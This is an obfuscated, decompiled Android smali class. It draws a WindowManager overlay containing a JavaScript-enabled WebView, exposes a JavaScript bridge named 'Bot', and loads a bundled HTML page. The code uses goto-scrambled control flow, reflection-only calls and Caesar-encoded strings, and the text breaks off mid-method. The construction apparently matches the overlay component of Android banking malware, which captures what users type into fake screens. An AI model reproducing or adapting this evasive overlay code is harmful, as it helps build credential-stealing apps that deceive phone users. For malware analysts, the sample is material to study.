.class public Lcom/EDzgPz/KwIOuS/lvjaxn;
.super Landroid/widget/RelativeLayout;


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "SetJavaScriptEnabled"
    }
.end annotation

.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;
    }
.end annotation


# instance fields
.field private height:I

.field protected layoutParams:Landroid/view/WindowManager$LayoutParams;

.field private layoutResId:I

.field private notificationId:I

.field private width:I


# direct methods
.method public constructor <init>(Lcom/EDzgPz/KwIOuS/dNuGTM;)V
    .locals 6
    .param p1, "service"    # Lcom/EDzgPz/KwIOuS/dNuGTM;

    .prologue
    nop

    goto :goto_9

    :goto_0
    nop

    return-void

    nop

    goto :goto_a

    :goto_1
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->load()V

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-virtual {p0, v1}, Lcom/EDzgPz/KwIOuS/lvjaxn;->setLongClickable(Z)V

    nop

    goto :goto_1

    :goto_3
    nop

    iput v1, p0, Lcom/EDzgPz/KwIOuS/lvjaxn;->notificationId:I

    nop

    goto :goto_2

    :goto_4
    nop

    iput v0, p0, Lcom/EDzgPz/KwIOuS/lvjaxn;->layoutResId:I

    nop

    goto :goto_3

    :goto_5
    nop

    const/high16 v0, 0x7f030000

    nop

    goto :goto_4

    :goto_6
    nop

    iput v0, p0, Lcom/EDzgPz/KwIOuS/lvjaxn;->notificationId:I

    nop

    goto :goto_5

    :goto_7
    nop

    const/4 v0, 0x0

    nop

    goto :goto_6

    :goto_8
    nop

    invoke-direct {p0, p1}, Landroid/widget/RelativeLayout;-><init>(Landroid/content/Context;)V

    nop

    goto :goto_7

    :goto_9
    nop

    const/4 v1, 0x1

    nop

    goto :goto_8

    :goto_a
    nop

    nop
.end method

.method private inflateView()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xinflateView()V

    return-void
.end method

.method private setupLayoutParams()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xsetupLayoutParams()V

    return-void
.end method

.method private xaddView()V
    .locals 6

    .prologue
    nop

    goto :goto_9

    :goto_0
    nop

    return-void

    nop

    goto :goto_a

    :goto_1
    nop

    invoke-super {p0, v0}, Landroid/widget/RelativeLayout;->setVisibility(I)V

    nop

    goto :goto_0

    :goto_2
    nop

    const/16 v0, 0x8

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v2, 0x2

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Landroid/view/View;

    aput-object v5, v3, v2

    aput-object p0, v4, v2

    const/4 v2, 0x1

    const-class v5, Landroid/view/ViewGroup$LayoutParams;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "addView"

    const-class v5, Landroid/view/WindowManager;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_2

    :goto_4
    nop

    iget-object v1, p0, Lcom/EDzgPz/KwIOuS/lvjaxn;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    nop

    goto :goto_3

    :goto_5
    nop

    check-cast v0, Landroid/view/WindowManager;

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v2, 0x1

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "getSystemService"

    const-class v5, Landroid/content/Context;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Object;

    nop

    goto :goto_5

    :goto_7
    nop

    const-string v1, "xjoepx"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_6

    :goto_8
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getContext()Landroid/content/Context;

    move-result-object v0

    nop

    goto :goto_7

    :goto_9
    nop

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->setupLayoutParams()V

    nop

    goto :goto_8

    :goto_a
    nop

    nop
.end method

.method private xanimationView()Landroid/view/View;
    .locals 4

    .prologue
    nop

    goto :goto_0

    :goto_0
    nop

    return-object p0

    nop

    goto :goto_1

    :goto_1
    nop

    nop
.end method

.method private xdestory()V
    .locals 6

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return-void

    nop

    goto :goto_6

    :goto_1
    nop

    const/4 v2, 0x1

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Landroid/view/View;

    aput-object v5, v3, v2

    aput-object p0, v4, v2

    const-string v2, "removeView"

    const-class v5, Landroid/view/WindowManager;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_0

    :goto_2
    nop

    check-cast v0, Landroid/view/WindowManager;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v2, 0x1

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "getSystemService"

    const-class v5, Landroid/content/Context;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Object;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v1, "xjoepx"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getContext()Landroid/content/Context;

    move-result-object v0

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xgetLayoutGravity()I
    .locals 5

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return v0

    nop

    goto :goto_2

    :goto_1
    nop

    const/16 v0, 0x11

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method

.method private xgetLeftOnScreen()I
    .locals 6

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return v1

    nop

    goto :goto_6

    :goto_1
    nop

    aget v1, v0, v1

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v1, 0x0

    nop

    goto :goto_1

    :goto_3
    nop

    invoke-virtual {p0, v0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getLocationOnScreen([I)V

    nop

    goto :goto_2

    :goto_4
    nop

    new-array v0, v1, [I

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v1, 0x2

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xgetService()Lcom/EDzgPz/KwIOuS/dNuGTM;
    .locals 5

    .prologue
    nop

    goto :goto_2

    :goto_0
    nop

    return-object v0

    nop

    goto :goto_3

    :goto_1
    nop

    check-cast v0, Lcom/EDzgPz/KwIOuS/dNuGTM;

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getContext()Landroid/content/Context;

    move-result-object v0

    nop

    goto :goto_1

    :goto_3
    nop

    nop
.end method

.method private xgetTopOnScreen()I
    .locals 6

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return v1

    nop

    goto :goto_6

    :goto_1
    nop

    aget v1, v0, v1

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v1, 0x1

    nop

    goto :goto_1

    :goto_3
    nop

    invoke-virtual {p0, v0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getLocationOnScreen([I)V

    nop

    goto :goto_2

    :goto_4
    nop

    new-array v0, v1, [I

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v1, 0x2

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xhide()V
    .locals 5

    .prologue
    nop

    goto :goto_2

    :goto_0
    nop

    return-void

    nop

    goto :goto_3

    :goto_1
    nop

    invoke-super {p0, v0}, Landroid/widget/RelativeLayout;->setVisibility(I)V

    nop

    goto :goto_0

    :goto_2
    nop

    const/16 v0, 0x8

    nop

    goto :goto_1

    :goto_3
    nop

    nop
.end method

.method private xinflateView()V
    .locals 9

    .prologue
    nop

    goto/16 :goto_25

    :goto_0
    nop

    return-void

    nop

    goto/16 :goto_26

    :goto_1
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const-string v5, "loadUrl"

    const-class v8, Landroid/webkit/WebView;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_0

    :goto_2
    nop

    const-string v2, "gjmf;000boespje`bttfu0joefy/iunm"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/Object;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const/4 v5, 0x1

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const-string v5, "addJavascriptInterface"

    const-class v8, Landroid/webkit/WebView;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v3, "Cpu"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-direct {v2, p0, v3}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;-><init>(Lcom/EDzgPz/KwIOuS/lvjaxn;Landroid/content/Context;)V

    nop

    goto :goto_4

    :goto_6
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getContext()Landroid/content/Context;

    move-result-object v3

    nop

    goto :goto_5

    :goto_7
    nop

    new-instance v2, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;

    nop

    goto :goto_6

    :goto_8
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v3}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "setCacheMode"

    const-class v8, Landroid/webkit/WebSettings;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_7

    :goto_9
    nop

    const/4 v3, 0x2

    nop

    goto :goto_8

    :goto_a
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "getSettings"

    const-class v8, Landroid/webkit/WebView;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/webkit/WebSettings;

    nop

    goto :goto_9

    :goto_b
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Landroid/webkit/WebSettings$RenderPriority;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const-string v5, "setRenderPriority"

    const-class v8, Landroid/webkit/WebSettings;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_a

    :goto_c
    nop

    sget-object v3, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    nop

    goto :goto_b

    :goto_d
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "getSettings"

    const-class v8, Landroid/webkit/WebView;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/webkit/WebSettings;

    nop

    goto :goto_c

    :goto_e
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    sget-object v8, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Boolean;

    invoke-direct {v8, v4}, Ljava/lang/Boolean;-><init>(Z)V

    aput-object v8, v7, v5

    const-string v5, "setUseWideViewPort"

    const-class v8, Landroid/webkit/WebSettings;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_d

    :goto_f
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "getSettings"

    const-class v8, Landroid/webkit/WebView;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/webkit/WebSettings;

    nop

    goto :goto_e

    :goto_10
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    sget-object v8, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Boolean;

    invoke-direct {v8, v4}, Ljava/lang/Boolean;-><init>(Z)V

    aput-object v8, v7, v5

    const-string v5, "setBuiltInZoomControls"

    const-class v8, Landroid/webkit/WebSettings;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_f

    :goto_11
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "getSettings"

    const-class v8, Landroid/webkit/WebView;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/webkit/WebSettings;

    nop

    goto :goto_10

    :goto_12
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    sget-object v8, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Boolean;

    invoke-direct {v8, v4}, Ljava/lang/Boolean;-><init>(Z)V

    aput-object v8, v7, v5

    const-string v5, "setSupportMultipleWindows"

    const-class v8, Landroid/webkit/WebSettings;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_11

    :goto_13
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "getSettings"

    const-class v8, Landroid/webkit/WebView;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/webkit/WebSettings;

    nop

    goto :goto_12

    :goto_14
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    sget-object v8, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Boolean;

    invoke-direct {v8, v4}, Ljava/lang/Boolean;-><init>(Z)V

    aput-object v8, v7, v5

    const-string v5, "setSaveFormData"

    const-class v8, Landroid/webkit/WebSettings;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_13

    :goto_15
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "getSettings"

    const-class v8, Landroid/webkit/WebView;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/webkit/WebSettings;

    nop

    goto :goto_14

    :goto_16
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    sget-object v8, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Boolean;

    invoke-direct {v8, v4}, Ljava/lang/Boolean;-><init>(Z)V

    aput-object v8, v7, v5

    const-string v5, "setSupportZoom"

    const-class v8, Landroid/webkit/WebSettings;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_15

    :goto_17
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "getSettings"

    const-class v8, Landroid/webkit/WebView;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/webkit/WebSettings;

    nop

    goto :goto_16

    :goto_18
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    sget-object v8, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Boolean;

    invoke-direct {v8, v3}, Ljava/lang/Boolean;-><init>(Z)V

    aput-object v8, v7, v5

    const-string v5, "setJavaScriptEnabled"

    const-class v8, Landroid/webkit/WebSettings;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_17

    :goto_19
    nop

    const/4 v3, 0x1

    nop

    goto :goto_18

    :goto_1a
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "getSettings"

    const-class v8, Landroid/webkit/WebView;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/webkit/WebSettings;

    nop

    goto :goto_19

    :goto_1b
    nop

    check-cast v1, Landroid/webkit/WebView;

    nop

    goto :goto_1a

    :goto_1c
    nop

    invoke-virtual {p0, v2}, Lcom/EDzgPz/KwIOuS/lvjaxn;->findViewById(I)Landroid/view/View;

    move-result-object v1

    nop

    goto :goto_1b

    :goto_1d
    nop

    const/high16 v2, 0x7f070000

    nop

    goto :goto_1c

    :goto_1e
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->onInflateView()V

    nop

    goto :goto_1d

    :goto_1f
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v2}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const/4 v5, 0x1

    const-class v8, Landroid/view/ViewGroup;

    aput-object v8, v6, v5

    aput-object p0, v7, v5

    const-string v5, "inflate"

    const-class v8, Landroid/view/LayoutInflater;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v0, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_1e

    :goto_20
    nop

    iget v2, p0, Lcom/EDzgPz/KwIOuS/lvjaxn;->layoutResId:I

    nop

    goto :goto_1f

    :goto_21
    nop

    check-cast v0, Landroid/view/LayoutInflater;

    nop

    goto :goto_20

    :goto_22
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const-string v5, "getSystemService"

    const-class v8, Landroid/content/Context;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Object;

    nop

    goto :goto_21

    :goto_23
    nop

    const-string v3, "mbzpvu`jogmbufs"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_22

    :goto_24
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getContext()Landroid/content/Context;

    move-result-object v2

    nop

    goto :goto_23

    :goto_25
    nop

    const/4 v4, 0x0

    nop

    goto :goto_24

    :goto_26
    nop

    nop
.end method

.method private xisVisible()Z
    .locals 5

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return v0

    nop

    goto :goto_2

    :goto_1
    nop

    const/4 v0, 0x1

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method

.method private xload()V
    .locals 4

    .prologue
    nop

    goto :goto_3

    :goto_0
    nop

    return-void

    nop

    goto :goto_4

    :goto_1
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->refresh()V

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->addView()V

    nop

    goto :goto_1

    :goto_3
    nop

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->inflateView()V

    nop

    goto :goto_2

    :goto_4
    nop

    nop
.end method

.method private xonInflateView()V
    .locals 4

    .prologue
    nop

    goto :goto_0

    :goto_0
    nop

    return-void

    nop

    goto :goto_1

    :goto_1
    nop

    nop
.end method

.method private xonSetupLayoutParams()V
    .locals 4

    .prologue
    nop

    goto :goto_0

    :goto_0
    nop

    return-void

    nop

    goto :goto_1

    :goto_1
    nop

    nop
.end method

.method private xonVisibilityToChange(I)Z
    .locals 5
    .param p1, "visibility"    # I

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return v0

    nop

    goto :goto_2

    :goto_1
    nop

    const/4 v0, 0x1

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method

.method private xrefresh()V
    .locals 5

    .prologue
    nop

    goto :goto_8

    :goto_0
    nop

    goto :goto_4

    nop

    goto :goto_9

    :goto_1
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->refreshViews()V

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-virtual {p0, v0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->setVisibility(I)V

    nop

    goto :goto_1

    :cond_0
    :goto_3
    nop

    const/4 v0, 0x0

    nop

    goto :goto_2

    :goto_4
    nop

    return-void

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-virtual {p0, v0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->setVisibility(I)V

    nop

    goto :goto_4

    :goto_6
    nop

    const/16 v0, 0x8

    nop

    goto :goto_5

    :goto_7
    nop

    if-nez v0, :cond_0

    nop

    goto :goto_6

    :goto_8
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->isVisible()Z

    move-result v0

    nop

    goto :goto_7

    :goto_9
    nop

    nop
.end method

.method private xrefreshLayout()V
    .locals 6

    .prologue
    nop

    goto :goto_c

    :cond_0
    :goto_0
    nop

    return-void

    nop

    goto :goto_d

    :goto_1
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->refresh()V

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v2, 0x2

    new-array v3, v2, [Ljava/lang/Class;

